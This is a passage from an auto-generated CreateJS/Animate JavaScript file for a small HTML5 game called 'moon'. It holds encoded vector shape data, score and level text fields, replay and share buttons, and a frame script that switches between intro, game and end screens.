	this.shape_4.graphics.f("#FFFEFD").s().p("AgdFeQgMgOAAgXIAAivIi6AAQgjgCgZgWQgbgbABgiIAAi8QAAgjAZgbQAZgYAkAAIC6AAIAAheQAAgWAMgMQALgMATABQASgBANAMQAOAMAAAWIAABeIC3AAQAmAAAZAbQAWAZABAiIAAC8QgCAigXAZQgYAaglAAIi3AAIAACvQAAAVgOAOQgLANgUAAQgSAAgMgLgAAuA0ICTAAQAQAAAIgJQAIgLABgNIAAh2QAAgPgJgLQgKgKgOAAIiTAAgAjXh8QgJAMAAANIAAB2QAAAOAJAKQALAKAOgBICVAAIAAi7IiVAAIgBAAQgNAAgLALg");
	this.shape_4.setTransform(-130.6,-509.4);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f("#FFA300").s().p("AChRsQh9h2hYkvQhSkUANikQAHhdgJhZIgKhGQjehYg9jbQgThFAAhJIADg7QgpAAg+BjIg2BkQhHCHh4AxQgmAPgmAFIgeABQhrgRgmhTQgMgagEgdIgBgYQAWAfA3ASQAbAJAWACQBcAhBfhNQAwgnAdguQAyhbBQhhQAngxAegfQgEgWgngMIglgIQhGiuABiwQAAg4AHgwIAIgmQBqAjBbCLQAtBFAYA/QBVCkBjAnQAxAUAhgNIACgYQgjg7AAhdIAGhRQhthggBhPQAAgZAKgUIALgPQA7ghA3BMQAcAmAQAsQAJApAQAHQAJAEAHgFIAAgYQAch/A5gdQAdgOAXALQAiAmgOBKQgGAlgOAeQgRATgDAYQgCAMABAIQAxCDg/BXQgUAcgdATIgYAOQgOAeAUAhQARAbAYAIQBBAYBCBZQAhAtATAnQAngFAOAYQAGAMgBAOQAlBLCSBbQBJAtBCAeQgZAMgwgHIgrgJQADBUgTBbQgKAtgKAcQgTgvg7gyIg2gpQAcDDFFEoQCiCUCdBtQkRDglPA7QhpAThiAAgAFYE1QgGgsgYheIgYhVIhHAfQAFBDA8BFQAfAjAdAVIAAAAgACwgIQAeAZAjgDIAAhKQgiAIgmhOIgfhQQgWCVA8A1gAhqg8QgWj6gFhMQgngUgrgcQhWg2gTglQgOgOgNAOQgYAbAKCKIAIAjQAMArAWAoQBHCACOA2IAAAAgAiQwWIgFAIQgEAKAEAPQALAuBUBFIALAFQAMABABgUQgPgngWglQgkg8gdAAQgGAAgGACgABev/QgeASgLBFIAMABQAPADASAHQAOgTAKgWQAUgsgTgSQgFgBgEAAQgJAAgLAGg");
	this.shape_5.setTransform(-21.2,-700.9,0.932,0.932);

	this.instance = new lib.Path_1();
	this.instance.setTransform(0.3,-715.1,0.932,0.932,0,0,0,161.7,160.2);
	this.instance.shadow = new cjs.Shadow("rgba(255,188,39,0.208)",0,0,18);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#FFFEFD").s().p("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");
	this.shape_6.setTransform(0,-348.6);

	this.pTxt = new cjs.Text("99%", "bold 50px 'Arial'", "#FFA300");
	this.pTxt.name = "pTxt";
	this.pTxt.textAlign = "center";
	this.pTxt.lineHeight = 62;
	this.pTxt.lineWidth = 141;
	this.pTxt.setTransform(-122,-341.6);

	this.guankaTxt = new cjs.Text("426", "bold 60px 'Arial'", "#FFA300");
	this.guankaTxt.name = "guankaTxt";
	this.guankaTxt.textAlign = "center";
	this.guankaTxt.lineHeight = 72;
	this.guankaTxt.lineWidth = 141;
	this.guankaTxt.setTransform(116.1,-416.2);

	this.replayBtn = new lib.再来一次();
	this.replayBtn.setTransform(123.9,-174.9,1,1,0,0,0,107.8,41.1);
	new cjs.ButtonHelper(this.replayBtn, 0, 1, 2, false, new lib.再来一次(), 3);

	this.shareBtn = new lib.炫耀一下();
	this.shareBtn.setTransform(-123.8,-174.9,1,1,0,0,0,107.8,41.1);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f("#2B2D30").s().p("Ag3D7QhhgChNgyQg+AvhWgCQhagCg+g3Qg/g4ABhNQAChLBBg1QBBg1BaACQAcABAeAHQAmg+BGgkQBKglBVACQBZACBKAuQBJAsAgBHQAbgHAdABQA9ABAxAfQAxAdAVAtQAMgCALAAQAuABAfAcQAhAdgBAnQgBAnghAbQghAbgvgBQgdAAgagOQgcAbgmAOQgoAOgrgBQhOgBg4gvQgoAdgyAQQgwAOgyAAIgHAAg");
	this.shape_7.setTransform(223.8,-628.2);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#3E4149").s().p("AgVBiQgmgBgegUQgZATghgBQgjAAgZgWQgYgWAAgeQABgcAagVQAZgVAjABQAJAAAOADQAPgYAbgOQAdgPAhABQAiABAdARQAdASAMAcQAJgDANAAQAYABATALQATAMAJAQIAIAAQASAAANALQANALgBAQQAAAPgNALQgNAKgSAAQgMAAgKgGQgXAXgkgBQgdgBgXgSQgfAXgoAAIgEAAg");
	this.shape_8.setTransform(-258.8,-178.3);

	this.shape_9 = new cjs.Shape();
	this.shape_9.graphics.f("#3E4149").s().p("AhRFuQiNgDhwhKQgsAhg2ARQg5ASg9gBQiEgDhbhRQhbhRAChwQADhuBfhNQBehOCEADQArABApALQA4hbBng0QBqg2B8ADQCDACBtBDQBpBBAvBnQAngJAsAAQBYACBIAsQBGArAgBCQANgCATAAQBDABAvAqQAuApgBA5QgBA6gwAnQgxAnhDgBQgsgBglgUQgpAng4AUQg5AWhAgCQg4gBgzgTQgxgSgnggQg7ArhIAWQhGAVhKAAIgKAAg");
	this.shape_9.setTransform(-196.7,-272.3);

	this.shape_10 = new cjs.Shape();
	this.shape_10.graphics.f("#2B2D30").s().p("AiFJTQhygDhrghQhmgfhYg6QhHA2hZAcQhbAchjgCQjWgEiUiEQiUiEAEi2QAEizCah+QCah9DUAFQBGABBEARQBaiTCnhVQCshXDKAEQDWAFCwBsQCrBpBMCnQBBgPBGACQCPADB1BHQByBFAzBtQAYgEAdAAQBtADBLBDQBMBDgCBdQgCBdhOBAQhPBAhsgDQhIgBg9ggQhDA+hZAiQheAihngCQhbgChTgeQhQgeg+g0QhgBFh2AkQhyAjh4AAIgRAAg");
	this.shape_10.setTransform(135.4,-59.5);

	this.shape_11 = new cjs.Shape();
	this.shape_11.graphics.f("#35373A").s().p("AhnHPQhYgChUgaQhQgYhEgtQg3AphFAWQhHAXhNgCQimgDh0hnQhzhmADiOQADiLB4hiQB3hhCmADQA0ABA3AOQBGhyCChCQCGhFCdAEQCmADCJBUQCGBSA6CCQA1gMA0ACQBvACBbA3QBZA2AoBUQAVgDAUABQBUACA7A0QA7A0gBBIQgCBJg9AxQg9AyhVgCQg3gBgvgZQg0AxhHAaQhIAbhQgCQhHgChAgXQg/gXgwgpQhLA2hbAcQhZAbhdAAIgNAAg");
	this.shape_11.setTransform(-136.3,-724.4);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_11},{t:this.shape_10},{t:this.shape_9},{t:this.shape_8},{t:this.shape_7},{t:this.shareBtn},{t:this.replayBtn},{t:this.guankaTxt},{t:this.pTxt},{t:this.shape_6},{t:this.instance},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).wait(1));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(-316.4,-852.6,632.9,852.7);


// stage content:
(lib.moon = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		var myObj = this;
		onloadGame();
		
		function onloadGame(){
			
			myObj.introMC.visible = true;
			myObj.gameMC.visible = false;
			myObj.endMC.visible = false;
			
			
			myObj.introMC.startBtn.addEventListener("click", showGameMC.bind(this));
		}
		
		
		
		showEndMc = function(){
			myObj.introMC.visible = false;
			myObj.gameMC.visible = false;
			myObj.endMC.visible = true;
			myObj.endMC.dateUp();
		}
		
		
		
		
		function showGameMC(){
			myObj.gameMC.intoGame();
			myObj.introMC.visible = false;
			myObj.gameMC.visible = true;
			myObj.endMC.visible = false;
		}
		function showEndMC(){
			
			myObj.introMC.visible = false;
			myObj.gameMC.visible = false;
			myObj.endMC.visible = true;
			myObj.endMC.dateUp();
		}
		
		showHome2 = function(){
			myObj.introMC.visible = true;
			myObj.gameMC.visible = false;
			myObj.endMC.visible = false;
		}
		function showIntroMC(){
			myObj.introMC.visible = true;
			myObj.gameMC.visible = false;
			myObj.endMC.visible = false;
		}
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// endMC
	this.endMC = new lib.endMC();
	this.endMC.setTransform(360,518,1,1,0,0,0,0,-417.4);

	this.timeline.addTween(cjs.Tween.get(this.endMC).to({_off:true},1).wait(3));

	// gameMC
	this.gameMC = new lib.mc();
	this.gameMC.setTransform(360,484,1,1,0,0,0,313.3,382.4);

	this.timeline.addTween(cjs.Tween.get(this.gameMC).to({_off:true},1).wait(3));

	// introMC
	this.introMC = new lib.introMc();
	this.introMC.setTransform(360.9,533.4,1,1,0,0,0,0,-433.2);

	this.shape = new cjs.Shape();
	this.shape.graphics.f().s("#FFFFFF").ss(1,1,1).p("AmxAAINjAA");
	this.shape.setTransform(516.7,439.4);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f().s("#FFFFFF").ss(1,1,1).p("AmxAAINjAA");
	this.shape_1.setTransform(203.8,439.4);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#FFFEFD").s().p("AgHDKQA3goAWhKQAQg5AAhtIgyAAIAAgaIAyAAIAAg2QAAgkgCgVIAUACQAJAAABADQABADgHAHIABBgIA3AAIAAAOIABB0QgCBEgDAnQgFAngTASQgTARgYgGIgJghQAeAIALgNQAMgOADgwQACgkAAgqIAAhlIgiAAQgBA8gDAdQgEAtgKAlQgLAqgSAdQgUAggiAZgAihC5IgDgaIBcgKIAAgpIhQAAIAAgWIBQAAIAAgkIhIAAIAAiDIBIAAIAAgjIhbAAIAAgYIBbAAIAAgiIggADIgiAAIgGgaQAkADAugHQAtgGAWgNIANARQAJAJgDADQgEACgKgDQgMAFgQAEQgTAFgOACIAAAkIBXAAIAAAYIhXAAIAAAjIBFAAIAACDIhFAAIAAAkIBEAAIAAAWIhEAAIAAAoIBGgIIACAZIhAAHIhJAIIggAEQgEAMgFABIAAAAQgDAAgBgMgAgzAbIAxAAIAAgfIgxAAgAh8AbIA0AAIAAgfIg0AAgAgzgYIAxAAIAAghIgxAAgAh8gYIA0AAIAAghIg0AAg");
	this.shape_2.setTransform(543.8,395.1);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#FFFEFD").s().p("AisDAIAAgcIDWAAIAKhZIh7AAIgGAtIgbgGQALhHAIhMQAMhhADgjIhYAAIAAgbIExAAIAAAbIi9AAIgJBUICHAAIAIANIgYDoIBoAAIAAAcgAhEAwIB6AAIALhmIh4AAg");
	this.shape_3.setTransform(496.8,395);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f("#FFFEFD").s().p("AhRDSQgcgDgMgEQgPgFgGgKQgFgKgBgRIAAjTIEHAAIAAB7IjxAAIAABIQAAALAEAIQAEAIALAEQANAEAUABQAWACAnAAQAuAAAXgCQAZAAANgFQAMgEAFgJQADgGAEgRIADgdIAPALIAMAGIgEAXQgEAWgIAMQgHAMgQAGQgQAGgeABQgXACg1AAQguAAgWgCgAgGAvIBhAAIAAhJIhhAAgAh+AvIBhAAIAAhJIhhAAgAh8hhIAAhyIDbAAIAABygAhmh6ICvAAIAAhBIivAAg");
	this.shape_4.setTransform(450.2,395);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f("#FFFEFD").s().p("Ah0DmIAAh/IDnAAIAAB6IgXAAIAAgQIi3AAIAAAVgAhbC4IC3AAIAAg4Ii3AAgAivBKIAAgXIB4AAQAAgIgCgKIgEgQIAOgFIhCAAIAAhUIDkAAIAABUIg9AAIAHADQAHABgCAEQgCAEgDAAIgGAbIB4AAIAAAXgAgmARIAEARQACAKAAAHIBBAAIAFgSIADgVIhRAAgAhZgJIC0AAIAAgnIi0AAgAh9hpIAAgXIByAAIAAgiIiTAAIAAgYICTAAIAAgrIAUACQAJABAAAEQgCADgFACIAAAfICVAAIAAAYIiVAAIAAAiIBzAAIAAAXg");
	this.shape_5.setTransform(401.7,394.8);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#FFFEFD").s().p("Ag0CPQgOgKgIgTQgHgTAAgXQAAgNABgKQACgLAGgMQAEgLAJgLQAGgHARgPQgJgUgFgSQgDgPAAgOQABgOADgMQADgNAIgKQAGgKAKgEQAKgEAJAAQAGAAAGACIASAHIAAAgQgGgIgHgDQgHgDgHAAQgHAAgIAGQgHAGgEALQgEAMAAALQAAAJACAIQABAIAEANQAHARALAYQAFANAPAYIAWAlIAGgYIABgiIAVAAQAAAUgDAYQgFAYgFAQIAeAxIgbAAIgTgeIgIALIgIAIIgLAIQgHAEgFABQgGACgKAAQgSAAgPgKgAgsAWQgGAIgEAJQgEALgBAFQgBAIAAAIQAAAPAGAOQAEAMALAHQALAHAMAAQAHAAAIgCQAGgEADgDQAGgEADgFIAHgLIgagvIgYguQgJAIgJAKg");
	this.shape_6.setTransform(362.1,394.9);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f("#FFFEFD").s().p("AAmDGQAYAEAKgFQAKgGAAgVIAAibIj7AAIAAgaIFTAAIAAAaIhCAAIAACbQAAAfgKAOQgMARgfAAgAAACzIAAgeIhaAAIAAAeIgWAAIAAiCICEAAIAACCgAhaB+IBaAAIAAg1IhaAAgAiIgvQAdgKAbgZQAcgZANgfIhsAAIAAgaIBzAAIAMhDIAQAEQAJABAAADQACADgHAGIgJAyICUAAIAAAaIiJAAQAQAZApAcQAqAbAiAJIgSAXQgfgKgpgfQgqgfgVggQgQAlgeAdQgbAagdANg");
	this.shape_7.setTransform(319.1,395.4);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFEFD").s().p("AAyDSIgEgQIAUACQAPAAAEgFQAGgIAAgSIAAgiIirAAIAAgZICrAAIAAgiIAVAFQAKADAAADQgBADgHADIAAARIA9AAIAAAZIg9AAIAAArQAAAcgKAKQgJAKgbADIgQACIgCgRgAh9DdIAAkdIgMAbIgSAlIgTgSQAZgoAVg3QAYg7ALgzIAVAJQAIAHgBACQAAAEgIACIgcBUIAAFQgAgNCVIAMgSIATAVIAWAXIgOAUgAB4A3IhYAKIhXAGQgCAMgCAAQgEABgDgOIgHgZIBngEIAAgiIhSAAIAAh+IBSAAIAAgjIhnAAIAAgYIBnAAIAAgwIAVAEQAJACgBACQAAADgHAFIAAAgIBxAAIAAAYIhxAAIAAAjIBSAAIAAB+IgWAAIAsA+IgQAQgAA0AnIABAAIA0gGIgPgUIAEgGIgqAAgAA0gNIA7AAIAAghIg7AAgAgegNIA8AAIAAghIg8AAgAA0hCIA7AAIAAggIg7AAgAgehCIA8AAIAAggIg8AAg");
	this.shape_8.setTransform(271.9,395.1);

	this.shape_9 = new cjs.Shape();
